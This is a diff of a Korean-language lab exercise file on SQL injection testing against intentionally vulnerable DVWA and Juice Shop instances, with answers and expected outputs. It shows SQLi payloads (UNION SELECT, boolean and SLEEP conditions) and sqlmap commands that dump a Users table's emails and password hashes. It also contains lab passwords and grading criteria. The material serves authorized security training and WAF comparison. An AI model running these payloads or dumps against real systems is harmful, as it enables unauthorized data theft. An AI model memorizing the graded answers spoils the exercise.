@@ -6,11 +6,12 @@ week: 5
 description: |
   SQL Injection 유형별 점검 실습(WSTG-INPV-05). SQLi 는 웹앱이 사용자 입력을 DB 질의에 그대로
   이어붙일 때 입력 속 SQL 문법이 코드로 실행되는 결함이다(OWASP A03). 본 실습은 추출 방식이 다른
-  네 유형 — Union-based(결과에 직접), Boolean blind(참/거짓 응답 차이로 추론), Time blind(SLEEP
-  지연으로 추론), Error-based(에러 메시지에 노출) — 을 el34 의 취약 웹에 직접 던져 본다. 모든
-  페이로드는 공백을 %20, 작은따옴표를 %27 로 URL 인코딩해 전송한다. 같은 요청이 WAF(ModSecurity
-  942 룰군)에 잡혀 anomaly score 누적 → 949110 발동 → dvwa 403 으로 차단되는 과정을 modsec_audit.log
-  로 확인하고, juice(DetectionOnly)는 같은 페이로드에 200 으로 응답함을 비교한다. 마지막에 모든 유형을
+  네 유형 — Union-based(결과에 직접), Boolean blind(참/거짓 응답 차이로 추론), Time blind(지연으로
+  추론), Error-based(에러 메시지에 노출) — 을 SQLi 자동화 도구 sqlmap 으로 el34 의 취약 웹에 던져
+  본다. juice(DetectionOnly)에는 sqlmap 이 취약 파라미터를 자동 탐지하고 Users 테이블의 email·
+  password(MD5 해시)를 실제로 덤프(--dump)해 진짜 데이터 탈취를 입증하며, dvwa 에는 같은 sqlmap 이
+  WAF(ModSecurity 942 룰군→949110)에 403 으로 전부 차단됨을 확인한다. 그 탐지 흔적을 modsec_audit.log
+  의 942 룰 분포로 보고, 차단(dvwa)과 탐지만(juice)의 WAF 정책 차이를 비교한다. 마지막에 모든 유형을
   한 번에 막는 근본 방어 parameterized query 를 정리한다. 공격은 외부 공격자 VM 192.168.0.202(att/1)에서
   공인 진입 192.168.0.161로 — `ssh att@192.168.0.202`(비번 1)로 접속해 수행하고, 탐지 로그 확인은
   `ssh ccc@{{TARGET_IP}}`(el34 호스트) 후 `docker exec -it el34-web bash`. 인가된 실습만.
@@ -21,9 +22,9 @@ prerequisites:
   - "el34 호스트 SSH(ssh ccc@{{TARGET_IP}}, 비밀번호 1) + docker exec 접근"
   - "lecture §2(네 가지 추출 유형) §3(URL 인코딩 + 942→949110→403 메커니즘) §4(parameterized query 방어) 숙지"
 objectives:
-  - "Union/Boolean blind/Time blind SQLi 페이로드를 %20·%27 로 URL 인코딩해 대상 vhost 에 전송하고 응답 코드로 결과를 해석한다"
+  - "sqlmap 으로 Union/Boolean blind/Time blind SQLi 를 자동 탐지하고 juice 의 Users 테이블(email·password)을 실제로 덤프한다"
   - "유형별 SQLi 가 ModSec 942 룰군(942100/942160/942190 등)에 잡히는 분포를 modsec_audit.log 로 확인한다"
-  - "같은 페이로드가 dvwa(차단 403)와 juice(DetectionOnly 200)에서 다른 결과를 내는 WAF 정책 차이를 비교한다"
+  - "같은 sqlmap 이 dvwa(WAF 403 차단)와 juice(탐지만·추출 성공)에서 다른 결과를 내는 WAF 정책 차이를 비교한다"
   - "SQLi 의 근본 방어가 parameterized query 임을, 입력검증·최소권한·에러숨김·WAF 가 왜 보조인지를 설명한다"
 pass_threshold: 0.7
 steps:
@@ -40,188 +41,211 @@ steps:
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) 외부 공격자 VM 192.168.0.202(attacker)에서 dvwa vhost 도달 확인 — 본문 버리고 응답코드만 dvwa= 형식으로
-      echo -en "GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
+      # 1) dvwa 대상을 whatweb으로 핑거프린팅 — 응답코드·서버·타이틀 확인(SQLi 점검 대상 도달성)
+      whatweb -a1 --colour=never http://dvwa.el34.lab/
       ```
       ## 🔧 도구/옵션 풀이
-      - `ssh att@192.168.0.202 (비번 1)` : el34 호스트에서 공격자 컨테이너로 접속해 명령을 실행한다.
-      - `nc -w3 192.168.0.161 80` : raw HTTP 요청을 보내고 응답을 받는다(3초 타임아웃).
-      - `| head -1 | grep -oE '[0-9]{3}'` : 응답 상태 라인에서 코드만 `dvwa=<코드>` 형태로 출력한다.
-      - 요청의 `Host: dvwa.el34.lab` 줄 : fw 게이트웨이(192.168.0.161)로 보내되 Host 헤더로 dvwa vhost 를 지정.
+      - `ssh att@192.168.0.202 (비번 1)` : 외부 공격자 VM 으로 접속해 명령을 실행한다.
+      - `whatweb -a1 --colour=never http://dvwa.el34.lab/` : 웹 핑거프린팅 도구로 응답 코드·서버·타이틀을 수집한다.
+      - dvwa 는 루트 요청부터 `[403 Forbidden]` 으로 응답 = 앞단에 WAF(ModSecurity) 가 서 있는 차단형 자산이라는 신호다.
+      - SQLi 점검 대상은 dvwa(차단 모드)와 juice(탐지 전용) 두 vhost — Host 헤더(도메인)로 vhost 가 갈린다.
       ## ✅ 합격 기준
-      `dvwa` 출력 시 통과. **근거:** `dvwa=<코드>` 형태로 응답 코드가 찍히면 대상에 도달한 것이고,
-      이로써 SQLi 점검을 시작할 수 있다.
+      `403` 출력 시 통과. **근거:** whatweb 결과에 `[403 Forbidden]` 응답 코드가 찍히면 대상에 도달한
+      것이고(WAF 가 루트부터 차단), 이로써 SQLi 점검 대상임을 확인한다.
     hint: '도달성'
     category: survey
     points: 10
     answer: |
-      # 1) 외부 공격자 VM 192.168.0.202(attacker)에서 dvwa vhost 도달 확인 — 본문 버리고 응답코드만 dvwa= 형식으로
-      ssh att@192.168.0.202 "echo -en 'GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'"
-    answer_detail: "SQLi 점검의 첫 단계 = 대상 도달성 확인. el34 의 SQLi 점검 대상은 dvwa(ModSec 차단 모드, 403)와 juice(DetectionOnly, 200) 두 vhost 다. nc 응답 코드가 출력되면 도달 성공으로 판정한다."
+      # 1) dvwa 대상을 whatweb으로 핑거프린팅 — 응답코드·서버·타이틀 확인(SQLi 점검 대상 도달성)
+      ssh att@192.168.0.202 "whatweb -a1 --colour=never http://dvwa.el34.lab/"
+    answer_detail: "SQLi 점검의 첫 단계 = 대상 도달성·정체 확인. el34 의 SQLi 점검 대상은 dvwa(ModSec 차단 모드)와 juice(DetectionOnly) 두 vhost 다. whatweb 으로 dvwa.el34.lab 을 핑거프린팅하면 루트부터 [403 Forbidden] 이 떨어지는데, 이는 앞단 WAF(ModSecurity)가 스캐너 요청을 차단하는 차단형 자산이라는 신호다. 응답 코드가 출력되면 도달 성공으로 판정한다."
     expected_output: |
-      dvwa=302
+      http://dvwa.el34.lab/ [403 Forbidden] Apache[2.4.52], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], Title[403 Forbidden]
     verify:
       type: output_contains
-      expect: 'dvwa'
+      expect: '403'
       field: stdout
       semantic:
         intent: "대상 점검"
         success_criteria: ["도달"]
-        acceptable_methods: ["**[OSS] nc raw (권장)**"]
+        acceptable_methods: ["**[OSS] whatweb (권장)**"]
     target_vm: web
 
   - order: 2
     instruction: |
       ## 🎯 목표
-      가장 직접적인 추출 기법인 Union-based SQLi 를 dvwa 에 던져, 결과 화면에 다른 테이블
-      데이터를 덧붙이려는 시도가 WAF 에 어떻게 잡히는지 본다.
+      가장 직접적인 추출 기법인 Union-based SQLi 를 juice 에 sqlmap 으로 던져, 취약 파라미터를
+      자동 탐지하고 Users 테이블의 email·password 를 결과로 직접 뽑아낸다(진짜 데이터 탈취).
       ## 📖 개념 한 줄
       `UNION SELECT` 는 원래 질의 결과 뒤에 공격자가 고른 다른 데이터를 세로로 이어 붙여 같은
-      화면에 직접 빼내는 기법이다. 결과가 곧장 보이므로 가장 빠른 추출이다(lecture §2.1).
+      화면에 직접 빼내는 기법이다. 결과가 곧장 보이므로 가장 빠른 추출이며, sqlmap 이 이 추출을
+      자동화한다(lecture §2.1).
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) Union-based SQLi(1' UNION SELECT user,password FROM users-- -)를 %27·%20 인코딩해 dvwa에 전송 → 응답코드만 union= 형식으로
-      echo -en "GET /?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
-      # 2) 해석 — UNION SELECT로 결과에 직접 추출 시도, dvwa는 942→949110으로 403 차단
-      # → UNION SELECT로 결과에 직접 데이터 추출 시도. dvwa 403(942 탐지)
+      # 1) juice 검색 파라미터 q를 sqlmap으로 자동 SQLi — 취약 판정 + DBMS 식별
+      sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --level=2 --risk=2 --disable-coloring
+      # 2) Users 테이블에서 email·password를 실제로 덤프(--dump) — 진짜 데이터 탈취 입증
+      sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --dump -T Users -C email,password --disable-coloring
+      # 3) 해석 — 'q is vulnerable' + SQLite + Users 실데이터(MD5 해시) = 직접 추출 성공
+      # → q 파라미터 SQLi로 Users 테이블 실추출(admin 해시 0c36...). juice는 추출 성공
       ```
-      ## 🔧 페이로드/인코딩 풀이
-      - 원문 페이로드: `1' UNION SELECT user,password FROM users-- -`.
-      - URL 인코딩: `%27`=작은따옴표(`'`), `%20`=공백. el34 에서는 **공백을 반드시 `%20`** 으로
-        인코딩해야 URL 이 공백에서 잘리지 않고 페이로드가 온전히 전달된다.
-      - 끝의 `-- -` : SQL 주석으로, 뒤에 남은 원래 질의 조각을 무력화한다.
+      ## 🔧 도구/옵션 풀이
+      - `sqlmap -u "URL"` : URL 의 파라미터에 SQLi 페이로드를 자동 생성·주입하는 표준 SQLi 자동화 도구(인코딩도 자동).
+      - `--batch` : 대화형 질문에 기본값으로 자동 응답. `--level/--risk` : 탐지 범위·공격 강도(2/2 로 확대).
+      - `--dump -T Users -C email,password` : 탐지된 취약점으로 Users 테이블의 지정 컬럼을 실제로 추출한다.
+      - juice 검색 q 는 blind(참/거짓·시간) 컨텍스트라 sqlmap 이 blind 기법으로 한 비트씩 추출하지만, 결과는
+        UNION 처럼 Users 테이블 전체가 화면에 나온다 — 자동화가 있으면 blind 도 직접 추출과 같은 결과다.
       ## ✅ 합격 기준
-      `union=` 출력 시 통과. **근거:** `union=403` 이면 dvwa 의 ModSec 이 942(union 패턴)→949110 으로
-      차단한 결과로, "여기는 SQLi 를 차단하는 자산"이라는 신호다.
-    hint: 'UNION SELECT'
+      `Users` 출력 시 통과. **근거:** sqlmap 이 `parameter 'q' is vulnerable`·`back-end DBMS: SQLite` 를
+      판정하고 `Table: Users` 의 email·password 를 덤프하면 진짜 데이터 탈취(직접 추출)에 성공한 것이다.
+    hint: 'sqlmap --dump (Users 추출)'
     category: manipulation
     points: 12
     answer: |
-      # 1) Union-based SQLi(1' UNION SELECT user,password FROM users-- -)를 %27·%20 인코딩해 dvwa에 전송 → 응답코드만 union= 형식으로
-      ssh att@192.168.0.202 "echo "union=$(echo -en 'GET /?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')""
-      # 2) 해석 — UNION SELECT로 결과에 직접 추출 시도, dvwa는 942→949110으로 403 차단
-      # → UNION SELECT로 결과에 직접 데이터 추출 시도. dvwa 403(942 탐지)
-    answer_detail: "Union-based = UNION SELECT 로 다른 테이블(users) 데이터를 원래 결과 뒤에 이어 붙여 화면에 직접 추출하는 기법. 네 유형 중 가장 직접적·빠르다. 페이로드는 %27(작은따옴표)·%20(공백)으로 URL 인코딩해 전송하며, dvwa(차단 모드)에서는 942→949110 으로 403 차단되는 것이 정상이다."
+      # 1) juice 검색 파라미터 q를 sqlmap으로 자동 SQLi — 취약 판정 + DBMS 식별
+      ssh att@192.168.0.202 'sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --level=2 --risk=2 --disable-coloring'
+      # 2) Users 테이블에서 email·password를 실제로 덤프(--dump) — 진짜 데이터 탈취 입증
+      ssh att@192.168.0.202 'sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --dump -T Users -C email,password --disable-coloring'
+      # 3) 해석 — 'q is vulnerable' + SQLite + Users 실데이터(MD5 해시) = 직접 추출 성공
+      # → q 파라미터 SQLi로 Users 테이블 실추출(admin 해시 0c36...). juice는 추출 성공
+    answer_detail: "Union-based = 결과를 화면에 직접 뽑아내는 가장 빠른 추출 기법이며, sqlmap 이 이를 자동화한다. sqlmap 이 juice 검색 파라미터 q 를 취약(parameter 'q' is vulnerable)으로 판정하고 back-end DBMS: SQLite 를 식별한 뒤, --dump 로 Users 테이블의 email·password(MD5 해시)를 실제로 추출한다 — admin@juice-sh.op 의 해시 0c36e517e3fa95aabf1bbffc6744a4ef 등 진짜 데이터가 나온다. juice 의 q 는 blind 컨텍스트라 내부적으로 boolean/time 기법을 쓰지만 자동화 덕에 결과는 UNION 처럼 테이블 전체가 나온다. 채점은 stdout 에 'Users'(추출된 테이블)가 보이는지로 판정한다."
     expected_output: |
-      union=403
-      → UNION SELECT로 결과에 직접 데이터 추출 시도. dvwa 403(942 탐지)
+      GET parameter 'q' is vulnerable.
+      back-end DBMS: SQLite
+      Database: <current>  Table: Users  [3 entries]
+      +------------------------+----------------------------------+
+      | email                  | password                         |
+      +------------------------+----------------------------------+
+      | J12934@juice-sh.op     | 0192023a7bbd73250516f069df18b500 |
+      | accountant@juice-sh.op | e541ca7ecf72b8d1286474fc613e5e45 |
+      | admin@juice-sh.op      | 0c36e517e3fa95aabf1bbffc6744a4ef |
+      +------------------------+----------------------------------+
+      → q 파라미터 SQLi로 Users 테이블 실추출(admin 해시 0c36...). juice는 추출 성공
     verify:
       type: output_contains
-      expect: 'union='
+      expect: 'Users'
       field: stdout
       semantic:
-        intent: "Union SQLi"
-        success_criteria: ["UNION 시도"]
-        acceptable_methods: ["**[OSS] UNION SELECT (권장)**"]
+        intent: "Union SQLi(sqlmap 추출)"
+        success_criteria: ["실데이터 덤프"]
+        acceptable_methods: ["**[OSS] sqlmap (권장)**"]
     target_vm: web
 
   - order: 3
     instruction: |
       ## 🎯 목표
-      결과가 화면에 안 보일 때 쓰는 간접 추론 기법인 Boolean blind 를 juice 에 던져, 참 조건과
-      거짓 조건의 응답 차이로 데이터를 추론하는 원리를 체감한다.
+      결과가 화면에 안 보일 때 쓰는 간접 추론 기법인 Boolean blind 를, sqlmap 의 boolean 기법(-B)
+      으로 juice 에 던져 참/거짓 응답 차이로 추론하는 원리를 확인한다.
       ## 📖 개념 한 줄
       `'1'='1'`(항상 참)과 `'1'='2'`(항상 거짓)에 대한 서버 응답 차이(길이·내용)를 신호로 삼아,
       "예/아니오" 질문을 반복해 데이터를 한 비트씩 좁혀간다 — 느리지만 결과가 안 보여도 추출
-      가능하다(lecture §2.2).
+      가능하다. sqlmap 이 이 참/거짓 판별을 자동 수행한다(lecture §2.2).
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) 참 조건(1' AND '1'='1)을 juice에 전송 → 응답코드를 true= 로
-      echo -en "GET /?id=1%27%20AND%20%271%27=%271 HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
-      # 2) 거짓 조건(1' AND '1'='2)을 juice에 전송 → 응답코드를 false= 로(참/거짓만 다르고 나머지 동일)
-      echo -en "GET /?id=1%27%20AND%20%271%27=%272 HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
-      # 3) 해석 — 참(1=1)/거짓(1=2) 응답 차이로 1비트씩 추론(결과 노출 없어도 추출)
-      # → 참(1=1)/거짓(1=2) 응답 차이로 1비트씩 추론. 결과 노출 없어도 추출 가능
+      # 1) sqlmap을 boolean-based blind 기법(-B)으로 한정해 juice q 파라미터 점검
+      sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --level=2 --risk=2 --technique=B --disable-coloring
+      # 2) 해석 — 참/거짓(AND boolean) 페이로드로 응답 차이를 만들어 1비트씩 추론
+      # → boolean-based blind 확인. 참/거짓 응답 차이로 결과 노출 없어도 추출
       ```
-      ## 🔧 페이로드/인코딩 풀이
-      - 참 조건 원문: `1' AND '1'='1`  /  거짓 조건 원문: `1' AND '1'='2`.
-      - `%27`=작은따옴표(`'`), `%20`=공백. 두 요청은 참/거짓만 다르고 나머지는 동일하다.
-      - 대상이 juice(DetectionOnly)인 이유 — 차단되지 않아 참/거짓 응답을 끝까지 관찰할 수 있다.
+      ## 🔧 도구/옵션 풀이
+      - `--technique=B` : sqlmap 이 쓸 기법을 boolean-based blind 하나로 한정한다(B=Boolean).
+      - sqlmap 이 만드는 참 페이로드 예: `q=apple%' AND 5188=5188 AND 'uClH%'='uClH` — 참이면 원래 응답,
+        거짓이면 다른 응답이 되게 해 그 차이를 신호로 삼는다.
+      - 대상이 juice(DetectionOnly)인 이유 — 차단되지 않아 참/거짓 응답 차이를 끝까지 관찰할 수 있다.
       ## ✅ 합격 기준
-      `true=` 출력 시 통과. **근거:** `true=<코드>`/`false=<코드>` 두 응답 코드가 찍히면 Boolean blind
-      의 참/거짓 두 요청이 전송된 것으로, 응답 차이로 데이터를 추론할 준비가 된 것이다.
-    hint: "AND '1'='1 vs '1'='2"
+      `boolean-based blind` 출력 시 통과. **근거:** sqlmap 이 `Type: boolean-based blind` 로 취약을
+      확인하면 참/거짓 응답 차이로 데이터를 추론할 수 있음이 증명된 것이다.
+    hint: 'sqlmap --technique=B (boolean blind)'
     category: manipulation
     points: 12
     answer: |
-      # 1) 참 조건(1' AND '1'='1)을 juice에 전송 → 응답코드를 true= 로
-      ssh att@192.168.0.202 "echo "true=$(echo -en 'GET /?id=1%27%20AND%20%271%27=%271 HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')""
-      # 2) 거짓 조건(1' AND '1'='2)을 juice에 전송 → 응답코드를 false= 로(참/거짓만 다르고 나머지 동일)
-      ssh att@192.168.0.202 "echo "false=$(echo -en 'GET /?id=1%27%20AND%20%271%27=%272 HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')""
-      # 3) 해석 — 참(1=1)/거짓(1=2) 응답 차이로 1비트씩 추론(결과 노출 없어도 추출)
-      # → 참(1=1)/거짓(1=2) 응답 차이로 1비트씩 추론. 결과 노출 없어도 추출 가능
-    answer_detail: "Boolean blind = 결과가 화면에 안 보일 때, 참(1=1)/거짓(1=2) 조건에 대한 응답 차이(페이지 길이·내용)로 데이터를 1비트씩 추론하는 간접 기법. Union 보다 느리지만 결과가 직접 노출되지 않는 곳에서도 추출할 수 있다. 참/거짓 두 요청이 모두 전송되면 시도 성공으로 판정한다."
+      # 1) sqlmap을 boolean-based blind 기법(-B)으로 한정해 juice q 파라미터 점검
+      ssh att@192.168.0.202 'sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --level=2 --risk=2 --technique=B --disable-coloring'
+      # 2) 해석 — 참/거짓(AND boolean) 페이로드로 응답 차이를 만들어 1비트씩 추론
+      # → boolean-based blind 확인. 참/거짓 응답 차이로 결과 노출 없어도 추출
+    answer_detail: "Boolean blind = 결과가 화면에 안 보일 때, 참(1=1)/거짓(1=2) 조건에 대한 응답 차이(페이지 길이·내용)로 데이터를 1비트씩 추론하는 간접 기법이며 sqlmap 이 이를 자동화한다. --technique=B 로 기법을 boolean 으로 한정하면 sqlmap 이 Type: boolean-based blind 로 취약을 확인하고, q=apple%' AND 5188=5188 AND 'uClH%'='uClH 같은 참 페이로드로 응답 차이를 만들어 낸다. Union 보다 느리지만 결과가 직접 노출되지 않는 곳에서도 추출할 수 있다. 채점은 stdout 에 'boolean-based blind' 가 보이는지로 판정한다."
     expected_output: |
-      true=200 false=200
-      → 참(1=1)/거짓(1=2) 응답 차이로 1비트씩 추론. 결과 노출 없어도 추출 가능
+      GET parameter 'q' is vulnerable.
+      Parameter: q (GET)
+          Type: boolean-based blind
+          Title: AND boolean-based blind - WHERE or HAVING clause
+          Payload: q=apple%' AND 5188=5188 AND 'uClH%'='uClH
+      back-end DBMS: SQLite
+      → boolean-based blind 확인. 참/거짓 응답 차이로 결과 노출 없어도 추출
     verify:
       type: output_contains
-      expect: 'true='
+      expect: 'boolean-based blind'
       field: stdout
       semantic:
-        intent: "Boolean blind SQLi"
-        success_criteria: ["참/거짓 시도"]
-        acceptable_methods: ["**[OSS] AND 1=1/1=2 (권장)**"]
+        intent: "Boolean blind SQLi(sqlmap)"
+        success_criteria: ["boolean 기법 확인"]
+        acceptable_methods: ["**[OSS] sqlmap (권장)**"]
     target_vm: web
 
   - order: 4
     instruction: |
       ## 🎯 목표
-      참/거짓 응답 차이조차 없을 때의 최후 수단인 Time blind 를 dvwa 에 던져, 응답 지연이 곧
-      신호가 된다는 것을 체감한다.
+      참/거짓 응답 차이조차 없을 때의 최후 수단인 Time blind 를, sqlmap 의 시간 기법(-T)으로 juice
+      에 던져 응답 지연이 곧 신호가 된다는 것을 확인한다.
       ## 📖 개념 한 줄
-      `SLEEP(3)` 으로 DB 가 일부러 멈추게 해, "맞으면 늦게·틀리면 빨리" 응답하도록 만든다.
-      화면에 아무 차이가 없어도 응답 시간만으로 참/거짓을 추론한다 — 가장 느린 추출이다(lecture §2.3).
+      시간 지연(heavy query/SLEEP)으로 DB 가 일부러 늦게 응답하게 해, "맞으면 늦게·틀리면 빨리"
+      응답하도록 만든다. 화면에 아무 차이가 없어도 응답 시간만으로 참/거짓을 추론한다 — 가장 느린
+      추출이며, sqlmap 이 지연을 측정해 자동 추론한다(lecture §2.3).
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) Time blind(1' AND SLEEP(3)-- -)를 dvwa에 전송 → 응답코드(time=)와 총 응답시간(응답시간=초) 출력
-      echo -en "GET /?id=1%27%20AND%20SLEEP(3 HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')--%20-"
-      # 2) 해석 — SLEEP으로 응답 지연 유발 → 시간차로 추론, dvwa는 SLEEP 패턴을 942로 탐지(403)
-      # → SLEEP으로 응답 지연 유발 → 시간차로 추론. WAF가 SLEEP 패턴 탐지(403)
+      # 1) sqlmap을 time-based blind 기법(-T)으로 한정해 juice q 파라미터 점검
+      sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --level=2 --risk=2 --technique=T --disable-coloring
+      # 2) 해석 — 응답 지연(heavy query)을 유발해 시간차로 참/거짓 추론
+      # → time-based blind 확인. 응답 시간만으로 추론(가장 느린 최후 수단)
       ```
-      ## 🔧 페이로드/옵션 풀이
-      - 원문 페이로드: `1' AND SLEEP(3)-- -`  (`%27`=`'`, `%20`=공백, `-- -`=주석).
-      - 시간 기반 blind 관찰: `nc` 로 요청을 보낸 뒤 **응답 지연 여부**로 SLEEP 실행을 추론한다(총 응답 시간이 길어지면 지연 신호).
-      - dvwa(차단 모드)에서는 SLEEP 패턴이 942(blind 룰)에 잡혀 지연 전에 403 으로 막히는 것이 정상.
+      ## 🔧 도구/옵션 풀이
+      - `--technique=T` : sqlmap 이 쓸 기법을 time-based blind 하나로 한정한다(T=Time).
+      - sqlmap 은 참 조건일 때만 지연되는 heavy query 를 주입하고 응답 시간을 측정해 참/거짓을 판별한다 —
+        SQLite 는 SLEEP() 이 없어 무거운 연산으로 지연을 만든다(`SQLite > 2.0 AND time-based blind`).
+      - 응답 차이도 에러도 없는 가장 어려운 환경의 최후 수단이라 가장 느리다.
       ## ✅ 합격 기준
-      `time=` 출력 시 통과. **근거:** `time=<코드>` 와 `응답시간=<초>` 가 찍히면 Time blind(SLEEP)
-      페이로드 시도가 수행된 것이고, 응답 시간으로 참/거짓을 추론할 수 있다.
-    hint: 'AND SLEEP(3)'
+      `time-based blind` 출력 시 통과. **근거:** sqlmap 이 `Type: time-based blind` 로 취약을 확인하면
+      응답 지연(시간차)만으로 데이터를 추론할 수 있음이 증명된 것이다.
+    hint: 'sqlmap --technique=T (time blind)'
     category: manipulation
     points: 12
     answer: |
-      # 1) Time blind(1' AND SLEEP(3)-- -)를 dvwa에 전송 → 응답코드(time=)와 총 응답시간(응답시간=초) 출력
-      ssh att@192.168.0.202 "echo "time=$(echo -en 'GET /?id=1%27%20AND%20SLEEP(3)--%20- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')""
-      # 2) 해석 — SLEEP으로 응답 지연 유발 → 시간차로 추론, dvwa는 SLEEP 패턴을 942로 탐지(403)
-      # → SLEEP으로 응답 지연 유발 → 시간차로 추론. WAF가 SLEEP 패턴 탐지(403)
-    answer_detail: "Time blind = SLEEP() 등으로 응답을 일부러 지연시켜, 응답이 늦으면 참·빠르면 거짓으로 시간차 추론하는 기법. 응답 차이도 에러도 없는 가장 어려운 환경의 최후 수단이라 가장 느리다. dvwa 차단 모드에서는 SLEEP 패턴이 942 에 탐지되어 403 으로 막히며, time= 코드와 응답시간= 이 출력되면 시도 성공으로 판정한다."
+      # 1) sqlmap을 time-based blind 기법(-T)으로 한정해 juice q 파라미터 점검
+      ssh att@192.168.0.202 'sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --level=2 --risk=2 --technique=T --disable-coloring'
+      # 2) 해석 — 응답 지연(heavy query)을 유발해 시간차로 참/거짓 추론
+      # → time-based blind 확인. 응답 시간만으로 추론(가장 느린 최후 수단)
+    answer_detail: "Time blind = 시간 지연(heavy query/SLEEP)으로 응답을 일부러 늦춰, 응답이 늦으면 참·빠르면 거짓으로 시간차 추론하는 기법이며 sqlmap 이 지연을 측정해 자동 추론한다. --technique=T 로 기법을 시간 기반으로 한정하면 sqlmap 이 Type: time-based blind·SQLite > 2.0 AND time-based blind (heavy query) 로 취약을 확인한다. SQLite 는 SLEEP() 이 없어 무거운 연산으로 지연을 만든다. 응답 차이도 에러도 없는 가장 어려운 환경의 최후 수단이라 가장 느리다. 채점은 stdout 에 'time-based blind' 가 보이는지로 판정한다."
     expected_output: |
-      time=403 응답시간=0.001737s
-      → SLEEP으로 응답 지연 유발 → 시간차로 추론. WAF가 SLEEP 패턴 탐지(403)
+      GET parameter 'q' is vulnerable.
+      Parameter: q (GET)
+          Type: time-based blind
+          Title: SQLite > 2.0 AND time-based blind (heavy query)
+      back-end DBMS: SQLite
+      → time-based blind 확인. 응답 시간만으로 추론(가장 느린 최후 수단)
     verify:
       type: output_contains
-      expect: 'time='
+      expect: 'time-based blind'
       field: stdout
       semantic:
-        intent: "Time blind SQLi"
-        success_criteria: ["SLEEP 시도"]
-        acceptable_methods: ["**[OSS] SLEEP (권장)**"]
+        intent: "Time blind SQLi(sqlmap)"
+        success_criteria: ["time 기법 확인"]
+        acceptable_methods: ["**[OSS] sqlmap (권장)**"]
     target_vm: web
 
   - order: 5
     instruction: |
       ## 🎯 목표
-      앞서 던진 세 유형의 SQLi 가 WAF 에 어떻게 잡혔는지를 방어자 시선으로 확인해, 942 룰군이
-      SQLi 변형을 커버한다는 것을 modsec_audit.log 의 룰 ID 분포로 증명한다.
+      앞서 sqlmap 이 juice·dvwa 에 쏟아낸 SQLi 페이로드가 WAF 에 어떻게 잡혔는지를 방어자 시선으로
+      확인해, 942 룰군이 SQLi 변형을 커버한다는 것을 modsec_audit.log 의 룰 ID 분포로 증명한다.
       ## 📖 개념 한 줄
       ModSecurity 의 942 룰군은 SQLi 유형별로 나뉜다 — 942100(generic)·942160(blind/SLEEP)·
       942190(union)·942200 등. 이 룰들이 anomaly score 를 누적하고, 합이 임계 초과 시 949110 이
@@ -273,51 +297,51 @@ steps:
   - order: 6
     instruction: |
       ## 🎯 목표
-      동일한 SQLi 페이로드를 dvwa 와 juice 에 각각 보내, 같은 공격이 WAF 정책에 따라 다른 결과
-      (차단 vs 탐지만)를 낸다는 것을 직접 비교한다.
+      juice 에서 추출에 성공한 그 sqlmap 을 이번엔 dvwa 에 똑같이 던져, 같은 공격이 WAF 정책에
+      따라 다른 결과(차단 vs 탐지만)를 낸다는 것을 직접 비교한다.
       ## 📖 개념 한 줄
       취약점이 같아도 결과가 다른 이유는 WAF 의 모드 차이다 — dvwa 는 차단 모드(949110 발동 시
-      403), juice 는 DetectionOnly(탐지·기록만 하고 200 통과). 운영자의 정책 선택이다(lecture §1.3, §3.3).
+      403), juice 는 DetectionOnly(탐지·기록만 하고 통과). 운영자의 정책 선택이다(lecture §1.3, §3.3).
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) 동일 페이로드(1' UNION SELECT 1--)를 dvwa(차단 모드)에 전송 → dvwa= 응답코드
-      echo -en "GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
